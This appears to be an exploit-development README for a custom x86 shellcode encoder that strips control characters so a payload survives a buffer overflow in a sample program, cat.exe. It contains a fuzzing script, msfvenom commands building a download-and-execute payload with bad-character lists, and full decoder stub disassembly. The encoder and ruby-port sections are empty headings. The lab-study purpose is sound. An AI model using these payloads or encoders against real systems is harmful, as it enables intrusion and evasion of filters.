
# `phobectrl` x86 payload encoder, no control chars.

## Intro

> The stack buffer overflow in [cat.exe](../cat) couldn't contain control characters and msfvenom (its badchars) failed to encode them for certain payloads. _(At least with the used arguments.)_

* [phobectrl.py](phobectrl.py) is a script which can encode a payload to avoid control chars. 

### .. Setup

* The [cat.exe](../cat) sample file
* [ImmunityDebugger](https://www.immunityinc.com/products/debugger/)
* [Python >= 3.5](https://www.python.org)
* Test asm project created with:
  * [MASM32 SDK](http://www.masm32.com)
  * [EasyCode IDE](http://easycode.cat/English/)

---
## Bad control characters ..

### .. and the breaking of the payload in [cat.exe](../cat) 

With the  [cat.exe](../cat) sample in the  [fuzz5.py](../cat#fuzz5.py) part it was impossible to make a payload that contains [control chars](https://en.wikipedia.org/wiki/Control_character). The DEL control character with value `127` (or `0x7F`) was allowed. 

* Actually this python script `test1.py` reveals ..
```python
import os

with open('test.dat', 'wb') as outfile:
	for i in range(255, -1, -1):
		current = bytearray('{:02x}'.format(i) * 5, 'ascii')
		outfile.write(current + bytes([i]) + current + b'\r\n')
os.system('START CMD.EXE /K ..\\cat\\cat.exe test.dat')
```

* Reveals that control characters above `0x0D (CR)` are allowed, and  the `0x09 (TAB)` character too. The output stops at a `0x00 (NULL)` character before the end of the file. 
```
10101010101010101010
0f0f0f0f0f0f0f0f0f0f
0e0e0e0e0e0e0e0e0e0e
0d0d0d0d0d
d0d0d0d0d
0c0c0c0c0c
c0c0c0c0c
0b0b0b0b0b
b0b0b0b0b
0a0a0a0a0a
a0a0a0a0a
0909090909      0909090909
0808080808
808080808
0707070707
707070707
0606060606
606060606
0505050505
505050505
0404040404
404040404
0303030303
303030303
0202020202
202020202
0101010101
101010101
0000000000

```

### .. can't be encoded in msfvenom for certain payloads

* The initial test payload that popped up notepad could be encoded avoiding control characters. But other payload(s) failed.
```
root@kali:~# msfvenom --payload windows/download_exec --platform windows --arch x86 -b '\x00\x01\x02\x04\x05\x06\x07\x08\x0A\x0B\x0C\x0D\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F' -f hex URL=http://localhost/ EXE=a.exe 
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor failed with A valid encoding key could not be found.
Attempting to encode payload with 1 iterations of x86/countdown
Error: No valid set instruction could be created!
```

> **Note** maybe there are commandline arguments in msfvenom which allow the payload to be encoded without any control char **AND** only avoiding the bad characters for [cat.exe](../cat) actually works fine in msfvenom.
`root@kali:~# msfvenom --payload windows/download_exec --platform windows --arch x86 -b '\x00\x01\x02\x04\x05\x06\x07\x08\x0A\x0B\x0C\x0D' -f hex URL=http://localhost/ EXE=a.exe`

---
## The encoder/decoder

* The decoder stub is 52 or 56 bytes and
* uses a table of 2 bytes per encoded character.
* The maximum size of the encoded payload is ~~either maximum 12 bit or 4K long  excluded or~~ maximum 14 bit or 16K with the `0x7F (ESC)` character included. 

> eg: 500 byte payload, with 40 control chars => `500 + (40 * 2) + 52 = 632` bytes after encoding

> Because creating the payload failed this encoder/decoder was made. _(To avoid the characters `\x00\x01\x02\x04\x05\x06\x07\x08\x0A\x0B\x0C\x0D` the "x86/shikata_ga_nai" decoder adds merely `448 - 422 = 26` bytes. SO this decoder is not the best but does the job.. )_

### .. Creating an encoder


### .. Creating a decoder

* 56 byte decoder stub
```
000 | EB 31         | JMP SHORT 033 (getip)
002 | 80CA 80       | OR DL, 80
005 | EB 24         | JMP SHORT 02B (carried)
007 | 5E            | POP ESI
008 | B9 BAAAFFFF   | MOV ECX, FFFFAABA
00D | 81E1 BAAAFFFF | AND ECX, FFFFAABA
013 | 8BFE          | MOV EDI, ESI
015 | 2BF9          | SUB EDI, ECX
017 | F7D9          | NEG ECX
019 | D1E9          | SHR ECX, 1
01B | 33D2          | XOR EDX, EDX
01D | 66:8B544E FE  | MOV DX, WORD PTR [ESI + ECX * 2 - 2]
022 | 66:81E2 7F7F  | AND DX, 7F7F
027 | D0EE          | SHR DH, 1
029 | 72 D7         | JB SHORT 002 (carry)
02B | 80243A 7F     | AND BYTE PTR [EDX + EDI], 7F
02F | E2 EC         | LOOPD SHORT 01D (next)
031 | FFE7          | JMP EDI
033 | E8 CFFFFFFF   | CALL 007 (popip)
038
```
* 52 byte decoder stub
```
000 | EB 2D         | JMP SHORT 02F (getip)
002 | 80CA 80       | OR DL, 80
005 | EB 20         | JMP SHORT 027 (carried)
007 | 5E            | POP ESI
008 | B9 BAAAFFFF   | MOV ECX, FFFFAABA
00D | 8BFE          | MOV EDI, ESI
00F | 2BF9          | SUB EDI, ECX
011 | F7D9          | NEG ECX
013 | D1E9          | SHR ECX, 1
015 | 33D2          | XOR EDX, EDX
017 | 66:8B544E FE  | MOV DX, WORD PTR [ESI + ECX * 2 - 2]
01C | 66:81E2 7F7F  | AND DX, 7F7F
021 | D0EE          | SHR DH, 1
023 | 72 DD         | JB SHORT 002 (carry)
025 | 90            | NOP
026 | 90            | NOP
027 | 80243A 7F     | AND BYTE PTR [EDX + EDI], 7F
02B | E2 EA         | LOOPD SHORT 017 (next)
02D | FFE7          | JMP EDI
02F | E8 D3FFFFFF   | CALL 007 (popip)
034
```

### .. Port to ruby


---
##  References

* [CIS-77 Introduction to Computer Systems - Encoding Real x86 Instructions](http://www.c-jump.com/CIS77/CPU/x86/lecture.html)
* [X86 Opcode and Instruction Reference](http://ref.x86asm.net/index.html)
* [Intel 64 ia 32 architectures software developer instruction set reference manual](https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf)
* [Uninformed.org - Implementing a custom x86 encoder](http://www.uninformed.org/?v=5&a=3&t=sumry)

---